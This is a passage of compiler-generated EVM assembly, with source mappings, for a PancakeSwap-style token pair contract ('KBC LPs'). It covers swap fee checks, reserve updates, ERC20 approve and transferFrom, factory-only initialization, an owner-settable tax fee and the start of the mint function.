returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_163\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_163:\n      pop\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":13774:13778  this */\n      address\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13740:13765  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":13740:13765  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_164\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_164:\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_165\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_165:\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_166\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_166:\n      pop\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"Pair.sol\":13800:13814  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13828:13850  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"Pair.sol\":13817:13850  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n      tag_167\n      jumpi\n        /* \"Pair.sol\":13915:13916  0 */\n      0x00\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n      jump(tag_168)\n    tag_167:\n        /* \"Pair.sol\":13889:13899  amount0Out */\n      dup10\n        /* \"Pair.sol\":13877:13886  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13877:13899  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"Pair.sol\":13865:13873  balance0 */\n      dup4\n        /* \"Pair.sol\":13865:13900  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n    tag_168:\n        /* \"Pair.sol\":13800:13916  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"Pair.sol\":13926:13940  uint amount1In */\n      0x00\n        /* \"Pair.sol\":13966:13976  amount1Out */\n      dup10\n        /* \"Pair.sol\":13954:13963  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13954:13976  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"Pair.sol\":13943:13951  balance1 */\n      dup4\n        /* \"Pair.sol\":13943:13976  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n      tag_169\n      jumpi\n        /* \"Pair.sol\":14041:14042  0 */\n      0x00\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n      jump(tag_170)\n    tag_169:\n        /* \"Pair.sol\":14015:14025  amount1Out */\n      dup10\n        /* \"Pair.sol\":14003:14012  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":14003:14025  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"Pair.sol\":13991:13999  balance1 */\n      dup4\n        /* \"Pair.sol\":13991:14026  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n    tag_170:\n        /* \"Pair.sol\":13926:14042  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"Pair.sol\":14085:14086  0 */\n      0x00\n        /* \"Pair.sol\":14073:14082  amount0In */\n      dup3\n        /* \"Pair.sol\":14073:14086  amount0In > 0 */\n      gt\n        /* \"Pair.sol\":14073:14103  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_171\n      jumpi\n      pop\n        /* \"Pair.sol\":14102:14103  0 */\n      0x00\n        /* \"Pair.sol\":14090:14099  amount1In */\n      dup2\n        /* \"Pair.sol\":14090:14103  amount1In > 0 */\n      gt\n        /* \"Pair.sol\":14073:14103  amount0In > 0 || amount1In > 0 */\n    tag_171:\n        /* \"Pair.sol\":14052:14163  require(... */\n      tag_172\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_172:\n        /* \"Pair.sol\":14263:14284  uint balance0Adjusted */\n      0x00\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_173\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      tag_174\n        /* \"Pair.sol\":14329:14338  amount0In */\n      dup5\n        /* \"Pair.sol\":14343:14345  25 */\n      0x19\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      0xffffffff\n        /* \"Pair.sol\":14329:14342  amount0In.mul */\n      tag_175\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      tag_176\n        /* \"Pair.sol\":14305:14313  balance0 */\n      dup8\n        /* \"Pair.sol\":14318:14323  10000 */\n      0x2710\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      0xffffffff\n        /* \"Pair.sol\":14305:14317  balance0.mul */\n      tag_175\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"Pair.sol\":14305:14328  balance0.mul(10000).sub */\n      swap1\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"Pair.sol\":14305:14328  balance0.mul(10000).sub */\n      tag_177\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_173:\n        /* \"Pair.sol\":14263:14361  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"Pair.sol\":14375:14396  uint balance1Adjusted */\n      0x00\n        /* \"Pair.sol\":14417:14459  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_178\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      tag_174\n        /* \"Pair.sol\":14441:14450  amount1In */\n      dup5\n        /* \"Pair.sol\":14455:14457  25 */\n      0x19\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      0xffffffff\n        /* \"Pair.sol\":14441:14454  amount1In.mul */\n      tag_175\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":14417:14459  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_178:\n        /* \"Pair.sol\":14375:14473  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_181\n        /* \"Pair.sol\":14609:14619  10000 ** 2 */\n      0x05f5e100\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      tag_182\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":14574:14589  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"Pair.sol\":14574:14593  uint(_reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_182:\n        /* \"Pair.sol\":14574:14608  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"Pair.sol\":14574:14608  uint(_reserve0).mul(_reserve1).mul */\n      tag_175\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_181:\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      tag_183\n        /* \"Pair.sol\":14512:14528  balance0Adjusted */\n      dup4\n        /* \"Pair.sol\":14533:14549  balance1Adjusted */\n      dup4\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"Pair.sol\":14512:14532  balance0Adjusted.mul */\n      tag_175\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_183:\n        /* \"Pair.sol\":14512:14620  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"Pair.sol\":14487:14664  require(... */\n      tag_184\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_184:\n        /* \"Pair.sol\":1270:1271  _ */\n      pop\n      pop\n        /* \"Pair.sol\":14685:14734  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_185\n        /* \"Pair.sol\":14693:14701  balance0 */\n      dup5\n        /* \"Pair.sol\":14703:14711  balance1 */\n      dup5\n        /* \"Pair.sol\":14713:14722  _reserve0 */\n      dup9\n        /* \"Pair.sol\":14724:14733  _reserve1 */\n      dup9\n        /* \"Pair.sol\":14685:14692  _update */\n      tag_186\n        /* \"Pair.sol\":14685:14734  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_185:\n        /* \"Pair.sol\":14749:14815  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"Pair.sol\":14754:14764  msg.sender */\n      caller\n      swap2\n        /* \"Pair.sol\":14749:14815  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      jump\t// out\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n    tag_56:\n        /* \"Pair.sol\":1813:1821  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":1843:1851  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"Pair.sol\":1883:1901  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n      jump\t// out\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_59:\n        /* \"ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_189\n        /* \"ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"ERC20.sol\":2893:2901  _approve */\n      tag_190\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_188:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":587:608  address public token0 */\n    tag_61:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n    tag_64:\n        /* \"Pair.sol\":2973:2980  factory */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n        /* \"Pair.sol\":2959:2969  msg.sender */\n      caller\n        /* \"Pair.sol\":2959:2980  msg.sender == factory */\n      eq\n        /* \"Pair.sol\":2951:3003  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"Pair.sol\":3033:3039  token0 */\n      0x08\n        /* \"Pair.sol\":3033:3049  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"Pair.sol\":3059:3065  token1 */\n      0x09\n        /* \"Pair.sol\":3059:3075  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"Pair.sol\":3085:3091  taxfee */\n      0x0a\n        /* \"Pair.sol\":3085:3101  taxfee = _taxfee */\n      sstore\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n      jump\t// out\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_66:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_194\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_195\n      swap1\n        /* \"ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_177\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_195:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_194:\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_196\n        /* \"ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"ERC20.sol\":3415:3424  _transfer */\n      tag_197\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_196:\n      pop\n        /* \"ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_71:\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_73:\n        /* \"ERC20.sol\":299:301  18 */\n      0x12\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_75:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_78:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_80:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_82:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n    tag_85:\n        /* \"Pair.sol\":1415:1420  owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0f))\n        /* \"Pair.sol\":1401:1411  msg.sender */\n      caller\n        /* \"Pair.sol\":1401:1420  msg.sender == owner */\n      eq\n        /* \"Pair.sol\":1393:1458  require(msg.sender == owner, \"Only owner can call this function\") */\n      tag_199\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x21\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef\n      0x21\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_199:\n        /* \"Pair.sol\":1545:1551  taxfee */\n      0x0a\n        /* \"Pair.sol\":1545:1561  taxfee = _newtax */\n      sstore\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n      jump\t// out\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_88:\n        /* \"Pair.sol\":5310:5324  uint liquidity */\n      0x00\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_202\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_202:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":5379:5392  getReserves() */\n      tag_204\n        /* \"Pair.sol\":5379:5390  getReserves */\n      tag_56\n        /* \"Pair.sol\":5379:5392  getReserves() */\n      jump\t// in\n    tag_204:\n      pop\n        /* \"Pair.sol\":5440:5446  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":5466:5470  this */\n      address\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":5336:5392  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"Pair.sol\":5417:5430  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":5440:5446  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":5433:5457  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":5440:5446  token0 */\n      dup7\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_205\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_205:\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_206\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_206:\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_207\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_207:\n      pop\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":5505:5511  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":5531:5535  this */\n      address\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"Pair.sol\":5482:5495  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":5505:5511  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":5498:5522  IERC20(token1).balanceOf */\n      0x70a08231\n      